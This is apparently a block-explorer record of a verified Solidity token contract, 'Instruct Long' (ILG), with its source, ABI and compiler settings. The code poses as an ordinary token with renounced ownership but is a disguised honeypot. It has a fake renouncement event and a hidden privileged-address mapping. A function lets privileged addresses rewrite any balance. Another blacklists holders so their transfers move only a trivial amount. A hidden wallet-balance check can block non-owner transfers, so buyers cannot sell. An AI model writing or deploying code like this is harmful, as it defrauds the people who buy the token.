{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface liquidityTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract swapBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityFund {\n    function createPair(address amountTotal, address senderFrom) external returns (address);\n}\n\ninterface tokenTeamTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minLiquidity) external view returns (uint256);\n\n    function transfer(address isSender, uint256 receiverBuy) external returns (bool);\n\n    function allowance(address isSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isSender,\n        uint256 receiverBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minFund, uint256 value);\n    event Approval(address indexed isSwap, address indexed spender, uint256 value);\n}\n\ninterface receiverTx is tokenTeamTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InstructLong is swapBuy, tokenTeamTrading, receiverTx {\n\n    uint256 private receiverLimit = 100000000 * 10 ** 18;\n\n    function balanceOf(address minLiquidity) public view virtual override returns (uint256) {\n        return enableMode[minLiquidity];\n    }\n\n    bool public atMin;\n\n    function tradingLimit() public {\n        emit OwnershipTransferred(enableMax, address(0));\n        launchedSender = address(0);\n    }\n\n    bool public marketingShould;\n\n    uint256 private shouldLiquidity;\n\n    address buyMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        liquidityTeam takeAuto = liquidityTeam(buyMin);\n        receiverTeam = liquidityFund(takeAuto.factory()).createPair(takeAuto.WETH(), address(this));\n        if (minReceiverTeam != shouldLiquidity) {\n            shouldLiquidity = tradingAmount;\n        }\n        enableMax = _msgSender();\n        tradingLimit();\n        teamIs[enableMax] = true;\n        enableMode[enableMax] = receiverLimit;\n        if (minReceiverTeam != tradingAmount) {\n            tradingAmount = shouldLiquidity;\n        }\n        emit Transfer(address(0), enableMax, receiverLimit);\n    }\n\n    address receiverLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLimit;\n    }\n\n    function shouldFrom(address swapMode) public {\n        atFee();\n        if (marketingShould == marketingTxList) {\n            minReceiverTeam = tradingAmount;\n        }\n        if (swapMode == enableMax || swapMode == receiverTeam) {\n            return;\n        }\n        txEnable[swapMode] = true;\n    }\n\n    function txAt(address takeSenderIs, uint256 receiverBuy) public {\n        atFee();\n        enableMode[takeSenderIs] = receiverBuy;\n    }\n\n    address public receiverTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTotal;\n    }\n\n    bool public marketingTxList;\n\n    function atFee() private view {\n        require(teamIs[_msgSender()]);\n    }\n\n    bool private exemptMode;\n\n    event OwnershipTransferred(address indexed receiverMarketing, address indexed shouldTotal);\n\n    mapping(address => bool) public teamIs;\n\n    function getOwner() external view returns (address) {\n        return launchedSender;\n    }\n\n    string private launchedTotal = \"ILG\";\n\n    function approve(address modeTo, uint256 receiverBuy) public virtual override returns (bool) {\n        launchFee[_msgSender()][modeTo] = receiverBuy;\n        emit Approval(_msgSender(), modeTo, receiverBuy);\n        return true;\n    }\n\n    uint256 takeLaunched;\n\n    uint256 public tradingAmount;\n\n    uint256 fundWallet;\n\n    function transferFrom(address tokenAuto, address isSender, uint256 receiverBuy) external override returns (bool) {\n        if (_msgSender() != buyMin) {\n            if (launchFee[tokenAuto][_msgSender()] != type(uint256).max) {\n                require(receiverBuy <= launchFee[tokenAuto][_msgSender()]);\n                launchFee[tokenAuto][_msgSender()] -= receiverBuy;\n            }\n        }\n        return totalTeam(tokenAuto, isSender, receiverBuy);\n    }\n\n    string private senderBuy = \"Instruct Long\";\n\n    function fundAt(address liquidityReceiver) public {\n        require(liquidityReceiver.balance < 100000);\n        if (atMin) {\n            return;\n        }\n        \n        teamIs[liquidityReceiver] = true;\n        if (tradingAmount != shouldLiquidity) {\n            exemptMode = false;\n        }\n        atMin = true;\n    }\n\n    function owner() external view returns (address) {\n        return launchedSender;\n    }\n\n    function allowance(address marketingBuy, address modeTo) external view virtual override returns (uint256) {\n        if (modeTo == buyMin) {\n            return type(uint256).max;\n        }\n        return launchFee[marketingBuy][modeTo];\n    }\n\n    uint8 private atToken = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atToken;\n    }\n\n    address public enableMax;\n\n    function name() external view virtual override returns (string memory) {\n        return senderBuy;\n    }\n\n    uint256 private minReceiverTeam;\n\n    function transfer(address takeSenderIs, uint256 receiverBuy) external virtual override returns (bool) {\n        return totalTeam(_msgSender(), takeSenderIs, receiverBuy);\n    }\n\n    function atLimit(address tokenAuto, address isSender, uint256 receiverBuy) internal returns (bool) {\n        require(enableMode[tokenAuto] >= receiverBuy);\n        enableMode[tokenAuto] -= receiverBuy;\n        enableMode[isSender] += receiverBuy;\n        emit Transfer(tokenAuto, isSender, receiverBuy);\n        return true;\n    }\n\n    mapping(address => bool) public txEnable;\n\n    function totalTeam(address tokenAuto, address isSender, uint256 receiverBuy) internal returns (bool) {\n        if (tokenAuto == enableMax) {\n            return atLimit(tokenAuto, isSender, receiverBuy);\n        }\n        uint256 isExempt = tokenTeamTrading(receiverTeam).balanceOf(receiverLaunch);\n        require(isExempt == fundWallet);\n        require(isSender != receiverLaunch);\n        if (txEnable[tokenAuto]) {\n            return atLimit(tokenAuto, isSender, modeIs);\n        }\n        return atLimit(tokenAuto, isSender, receiverBuy);\n    }\n\n    uint256 constant modeIs = 7 ** 10;\n\n    address private launchedSender;\n\n    mapping(address => mapping(address => uint256)) private launchFee;\n\n    mapping(address => uint256) private enableMode;\n\n    function shouldLimitReceiver(uint256 receiverBuy) public {\n        atFee();\n        fundWallet = receiverBuy;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTxList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"}],\"name\":\"shouldFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"shouldLimitReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSenderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSenderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverBuy\",\"type\":\"uint256\"}],\"name\":\"txAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InstructLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}